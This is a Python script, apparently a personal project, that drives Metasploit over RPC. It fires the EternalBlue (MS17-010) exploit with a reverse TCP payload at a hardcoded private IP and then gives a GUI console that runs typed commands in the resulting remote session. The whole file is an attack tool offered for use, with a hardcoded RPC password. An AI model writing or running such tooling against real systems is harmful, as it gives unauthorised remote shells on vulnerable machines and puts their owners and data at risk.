import sys
import threading

import pymetasploit3.msfrpc
from pymetasploit3.msfrpc import MsfRpcClient

from libs.Attack import Attack
from libs.GUI_Template import GUI_Template
from libs.Logger import Logger
from libs.Modules import Modules
from libs.Payloads import Payloads

logger = Logger('Main')
client: MsfRpcClient


class GUI(GUI_Template):
    """
    繼承模板
    """

    def input_event(self, text):
        if not client:
            self.println('請等待 RPC 連線成功再輸入指令')
            return

        if len(client.sessions.list) == 0:
            self.println('目前無可用的 session 連線')
            return

        self.print(text)
        shell = client.sessions.session(list(client.sessions.list.keys())[0])
        self.print(shell.run_with_output(text))

    def global_key_event(self, event):
        ...
        # print(f'按鍵: {event}')


def attack_thread(gui):
    """
    異步攻擊線程

    :param  gui:
    :type   gui: (GUI)
    """

    # 建立客戶端
    try:
        logger.info('正在連線到 RPC...')
        global client
        client = MsfRpcClient("salt", port=55553, ssl=True)
        logger.succ('成功連線到 RPC')
    except pymetasploit3.msfrpc.MsfAuthError:
        logger.err('驗證失敗，無法連線到 RPC')
        sys.exit(1)

    # 建立攻擊
    atk = Attack(client, '192.168.2.200', Modules.MS17_010_ETERNALBLUE, Payloads.REVERSE_TCP)

    logger.info('正在開始攻擊...')
    # 開始攻擊
    gui.print(atk.run())


if __name__ == "__main__":
    # 初始化介面
    gui = GUI('My Console')

    # 異步線程執行攻擊
    t1 = threading.Thread(target=attack_thread, args=(gui,))
    t1.start()

    # 建立介面
    gui.build()

    # 等待攻擊線程完成
    logger.info('正在關閉...')
    t1.join()
    logger.info('關閉完成')
